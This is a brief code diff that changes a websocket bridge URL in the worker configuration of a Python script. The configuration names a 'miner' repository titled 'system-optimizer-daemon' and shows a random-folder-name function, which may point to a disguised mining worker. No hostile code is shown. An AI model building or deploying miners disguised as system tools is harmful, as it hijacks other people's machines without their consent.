@@ -11,7 +11,7 @@ from datetime import datetime
 
 # Worker config
 MINER_REPO = "https://github.com/crucifix-cray/system-optimizer-daemon.git"
-BRIDGE_URL = "wss://bridge-production-2e86.up.railway.app"
+BRIDGE_URL = "wss://bridge-production-2e86.up.railway.app/ws"
 
 
 def generate_random_folder_name() -> str:
